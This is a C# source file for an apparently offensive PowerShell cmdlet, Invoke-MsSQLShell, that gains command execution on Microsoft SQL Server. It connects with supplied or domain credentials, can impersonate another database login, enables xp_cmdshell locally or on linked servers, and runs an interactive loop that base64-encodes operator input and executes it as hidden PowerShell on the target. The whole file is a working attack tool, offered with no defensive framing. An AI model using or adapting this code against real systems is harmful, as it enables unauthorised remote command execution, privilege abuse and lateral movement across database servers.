using System;
using System.Collections.Generic;
using System.Linq;
using System;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using TurtleToolKitSQL;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "MsSQLShell")] // <- seeting cmdlet name and verbs
    [Alias("INVSQLSH")] //<- cmdlet alias
    public class InvokeMsSQLShell : Cmdlet
    {
        [Parameter(Mandatory = true)] [Alias("h")] public string targetServer { get; set; }
        [Parameter(Mandatory = true)] [Alias("d")] public string database { get; set; }
        [Parameter(Mandatory = true)] [Alias("ad")] public bool useAdCreds { get; set; }
        [Parameter(Mandatory = true)] [Alias("tl")] public bool targetingLink { get; set; }
        [Parameter(Mandatory = false)] [Alias("u")] public string user { get; set; }
        [Parameter(Mandatory = false)] [Alias("p")] public string password { get; set; }
        [Parameter(Mandatory = false)] [Alias("ls")] public string linkServer { get; set; }
        [Parameter(Mandatory = false)] [Alias("impersonate")] public string impersonateUser { get; set; }



        public static string targetLink;
        public static string impUser;
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            SQL sql;
            /// create connection
            if (useAdCreds)
            {
                sql = new SQL(targetServer, database, useAdCreds);
            }
            else
            {
                sql = new SQL(targetServer, database, useAdCreds, user, password);
            }
            targetLink = linkServer;
            impUser = impersonateUser;
            if (!ExecuteSQLShell(sql, targetingLink))
            {
                WriteWarning("Failed to execute shell...try using impersonation");
            }
            WriteVerbose("Success");
            sql.CloseDb();
        }
        //ExecuteSearchDB(sql);
        //WriteWarning("Use information listed above to run subsequent cmdlets");
        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }

        public static bool ExecuteSQLShell(SQL sqlObj,bool targetingLink)
        {
            bool res;
            // connect
            if (!sqlObj.ConnectToDb())
                return false;
            // if server is not a linked server
            if (!targetingLink)
            {
                // get shell on NON linked server
                // not impersonating user
                if (String.IsNullOrEmpty(impUser))
                {
                    return Shell(sqlObj);
                }
                //impersonating someone
                Console.WriteLine("Impersonating {0}",impUser);
                sqlObj.ImpersonateDbLogin(impUser);
                sqlObj.GetCurrentDbUser();
                res = Shell(sqlObj);
                sqlObj.RevertUser();
                return res;
            }
            // LINKED SERVER NEEDS AT QUERIES
            Console.WriteLine("LINK");
            Console.WriteLine(targetLink);
            // if not impersonating
            if (String.IsNullOrEmpty(impUser))
            {
                return LinkedShell(sqlObj,targetLink);
            }
            // impersonating
            Console.WriteLine("Impersonating {0}", impUser);
            sqlObj.ImpersonateDbLogin(impUser);
            sqlObj.GetCurrentDbUser();
            res = LinkedShell(sqlObj,targetLink);
            sqlObj.RevertUser();
            return res;

        }
        public static bool LinkedShell(SQL sqlObj,string lnkSrv)
        {
            Console.WriteLine("::: Attempting to enable advanced Options :::");
            string q = string.Format("EXEC ('sp_configure ''Show Advanced Options'',1; RECONFIGURE;') AT {0}", lnkSrv);
            if (!sqlObj.PerformQuery(q))
            {
                Console.WriteLine("Failed to enable advanced options");
                return false;
            }
            Console.WriteLine("::: Attempting to enabled xpCMDSHELL :::");
            q = string.Format("EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT {0}", lnkSrv);
            if (!sqlObj.PerformQuery(q))
            {
                Console.WriteLine("Failed to enable xp_cmdshell");
                return false;
            }
            // Attempting to start 'interactive shell'
            // EXEC ('xp_cmdshell ''whoami''') AT $currentSrv
            q = string.Format("EXEC ('xp_cmdshell ''whoami''') AT {0}", lnkSrv);
            if (!sqlObj.PerformQuery(q))
            {
                Console.WriteLine("Failed to execute whoami command");
            }
            Console.WriteLine("Attempting interactive shell...");
            Console.WriteLine("Powershell commands will be b64 encoded then executed");
            Console.WriteLine("To exit type EXIT");
            while (true)
            {
                Console.Write("PS turtle@{0}~$ ", sqlObj.targetServer);
                string cmd = Console.ReadLine();
                if (cmd == "EXIT") { break; }
                string payload = Convert.ToBase64String(Encoding.Unicode.GetBytes(cmd));
                //q = string.Format("EXEC ('xp_cmdshell ''whoami''') AT {0}", lnkSrv);
                q = string.Format("EXEC ('xp_cmdshell ''powershell.exe -NonI -Nop -windowstyle hidden -ec {0}''') AT {1}", payload, lnkSrv);
                if (!sqlObj.PerformQuery(q))
                {
                    Console.WriteLine("Failed to execute command");
                }
            }
            return true;
        }
        public static bool Shell(SQL sqlObj)
        {
            Console.WriteLine("::: Attempting to enable advanced Options :::");
            if (!sqlObj.PerformQuery("sp_configure 'Show Advanced Options',1; RECONFIGURE;"))
            {
                Console.WriteLine("Failed to enable advanced options");
                return false;
            }
            Console.WriteLine("::: Attempting to enabled xpCMDSHELL :::");
            if (!sqlObj.PerformQuery("sp_configure 'xp_cmdshell',1; RECONFIGURE;"))
            {
                Console.WriteLine("Failed to enable xp_cmdshell");
                return false;
            }
            // Attempting to start 'interactive shell'
            if (!sqlObj.PerformQuery("xp_cmdshell 'whoami'"))
            {
                Console.WriteLine("Failed to execute whoami command");
            }
            Console.WriteLine("Attempting interactive shell...");
            Console.WriteLine("Powershell commands will be b64 encoded then executed");
            Console.WriteLine("To exit type EXIT");
            while (true)
            {
                Console.Write("PS turtle@{0}~$ ", sqlObj.targetServer);
                string cmd = Console.ReadLine();
                if (cmd == "EXIT") { break; }
                string payload = Convert.ToBase64String(Encoding.Unicode.GetBytes(cmd));
                string fullPayload = string.Format("xp_cmdshell 'powershell.exe -NonI -Nop -windowstyle hidden -ec {0}'", payload);
                if (!sqlObj.PerformQuery(fullPayload))
                {
                    Console.WriteLine("Failed to execute command");
                }
            }
            return true;
        }
    }
}
